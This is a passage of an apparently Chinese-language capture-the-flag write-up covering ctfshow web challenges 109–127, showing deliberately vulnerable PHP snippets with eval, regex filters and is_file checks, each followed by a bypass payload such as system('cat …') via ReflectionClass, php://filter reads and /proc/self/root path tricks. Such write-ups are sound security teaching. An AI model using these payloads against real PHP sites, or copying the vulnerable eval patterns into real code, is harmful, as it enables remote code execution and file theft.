class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=ReflectionClass&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code></p><ul><li>从if判断中得出传入的参数需为字母</li><li>经过代码执行，输出一个数据</li><li>因为new可以得出，大概率是输出一个类</li><li>所以可以利用反射类<code>ReflectionClass(system())</code>加命令来操作</li></ul><h2 id="web110-FilesystemIterator-getcwd"><a href="#web110-FilesystemIterator-getcwd" class="headerlink" title="web110(FilesystemIterator(getcwd()))"></a>web110(FilesystemIterator(getcwd()))</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=FilesystemIterator&amp;v2=getcwd 访问文件</code></p><ul><li>过滤了一大堆东西，上道题的payload不能用了</li><li>利用内置类读文件</li><li><code>FilesystemIterator(getcwd())</code>返回、<ul><li>FilesystemIterator获取指定目录下的所有文件</li><li>getcwd()函数：获取当前工作目录 返回当前工作目录</li></ul></li><li>得到文件名字后，直接访问该文件</li></ul><h2 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111($GLOBALS)"></a>web111($GLOBALS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=ctfshow&amp;v2=GLOBALS</code></p><ul><li>根据代码发现唯一可能得到flag的地方在getflag这个方法里</li><li>两个if对传入的数据分别过滤了一大堆东西</li><li>第三个if发现v1的值需为ctfshow才能执行这个getflag方法</li><li>在getflag方法里<ul><li>eval将两个变量进行了引用，所以第二个参数我们传全局变量</li><li>通过变量覆盖，使输出的数据为$GLOBALS</li></ul></li></ul><h2 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><ul><li><p>is_file()：判断给定文件名是否为一个正常的文件，参数为文件路径</p></li><li><p>在linux中/proc/self/root是指向根目录的</p></li><li><p>多次上面的操作可以绕过is_file</p></li></ul><h2 id="web113-is-file"><a href="#web113-is-file" class="headerlink" title="web113(is_file)"></a>web113(is_file)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><h2 id="web114-php-filter"><a href="#web114-php-filter" class="headerlink" title="web114(php://filter/)"></a>web114(php://filter/)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?file=php://filter/resource=flag.php</code></p><ul><li>发现root被过滤了，读取文件用伪协议</li></ul><h2 id="web115-is-numeric，str-replace，trim"><a href="#web115-is-numeric，str-replace，trim" class="headerlink" title="web115(is_numeric，str_replace，trim)"></a>web115(is_numeric，str_replace，trim)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p><code>payload: ?num=%0c36</code></p><ul><li>str_replace($search ,$replace , $subject)：<ul><li>参数：第一个参数是目标字符，第二个参数是要替换的字符，第三个参数是进行替换的原字符串</li><li>返回值：一个字符串或者数组</li></ul></li><li>trim()：去除字符串首尾处的空白字符</li><li>is_numeric()可以用<code>空格+数字</code>绕过但是trim把空白字符过滤了<ul><li>那么可以使用<code>%0c</code>绕过trim</li></ul></li><li><code>$num!==&#39;36&#39;</code>和<code>$num==&#39;36&#39;</code>区别：<ul><li><code>!==</code>：只要类型不同就不全等</li></ul></li><li>所以加上<code>%0c</code>换页符，在<code>==</code><strong>进行类型转换</strong>，所有<code>%0c36</code>会被转换为数值36，结果true；在<code>!==</code><strong>不进行类型转换</strong>，所以字符串和数值比较，类型不同，结果true。</li></ul><h2 id="web123-gt"><a href="#web123-gt" class="headerlink" title="web123([=&gt;_)"></a>web123([=&gt;_)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: fun=echo $flag&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li><code>!isset($_GET[&#39;fl0g&#39;])</code>和<code>$fl0g===&quot;flag_give_me&quot;</code>冲突：<ul><li>所以GET传参不能传参数，而且源码自带的输出flag也不能利用，能利用的只有它提供的eval函数</li></ul></li></ul><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。如：<code>/?CTF=ctf</code>变成<code>Array([CTF] =&gt; &quot;ctf&quot;)</code>。<br>查询字符串在解析的过程中会删除空白符，同时将某些字符删除或用下划线代替。如，<code>/?CTF[SHOW=42</code>会转换为<code>Array([CTF_SHOW] =&gt; 42)</code>。</p></blockquote><h2 id="web125-SERVER-‘argv’"><a href="#web125-SERVER-‘argv’" class="headerlink" title="web125($_SERVER[‘argv’])"></a>web125($_SERVER[‘argv’])</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li>网页模式下：<br><code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code></li><li><code>$_SERVER[&quot;QUERY_STRING&quot;]</code>：获取的是?后面的值</li><li>assert()： 检查一个断言是否为FALSE</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br><span class="line">    </span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>() 会检查指定的 assertion 并在结果为 <span class="literal">FALSE</span> 时采取适当的行动。</span><br></pre></td></tr></table></figure><blockquote><p>所以我们get传入的数据会保存到一个索引为0的数组中，且会被当作php脚本执行<br>POST参数中：因为过滤了echo，所以可以利用断言函数assert来执行上述数组，从而让<code>$fl0g=flag_give_me</code></p></blockquote><h2 id="web126-SERVER-‘argv’"><a href="#web126-SERVER-‘argv’" class="headerlink" title="web126($_SERVER[‘argv’])"></a>web126($_SERVER[‘argv’])</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li>过滤了flag还有一堆字母，但是是针对POST参数，GET参数不影响，所以payload跟上道题一样</li></ul><h2 id="web127-SERVER-‘QUERY-STRING’"><a href="#web127-SERVER-‘QUERY-STRING’" class="headerlink" title="web127($_SERVER[‘QUERY_STRING’])"></a>web127($_SERVER[‘QUERY_STRING’])</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: 